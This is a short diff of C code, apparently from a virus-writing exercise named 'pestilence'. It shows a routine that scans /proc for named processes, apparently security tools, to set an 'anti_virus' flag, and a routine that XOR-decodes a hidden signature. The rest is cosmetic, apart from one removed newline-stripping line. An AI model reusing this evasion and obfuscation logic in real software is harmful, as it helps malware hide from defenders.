@@ -21,10 +21,10 @@ char    *ft_getproc(int i)
 
 void    ft_antiprocess(t_pestilence *pestilence)
 {
-    char            path[1024];
-    char            buff[1024];
-    int             i = 0;
-    int             fd;
+    char    buff[1024];
+    char    path[1024];
+    int     fd;
+    int     i = 0;
 
     pestilence->proc = opendir("/proc");
     pestilence->readproc = readdir(pestilence->proc);
@@ -42,10 +42,9 @@ void    ft_antiprocess(t_pestilence *pestilence)
                 memset(buff, 0, sizeof(buff));
                 read(fd, buff, sizeof(buff) - 1);
                 close(fd);
-                buff[strcspn(buff, "\n")] = 0;
                 if (!strcmp(ft_getproc(i), buff))
                     pestilence->anti_virus = 1;
-            }
+            }            
         }
         i++;
     }
@@ -57,7 +56,7 @@ void    ft_obfuscation(t_pestilence *pestilence)
     int i = 0;
     while (g_signature[i])
     {
-        pestilence->decrypted[i] = g_signature[i] ^ KEY;
+        pestilence->decrypted[i] = g_signature[i] ^  KEY;
         i++;
     }
     pestilence->decrypted[i] = '\0';
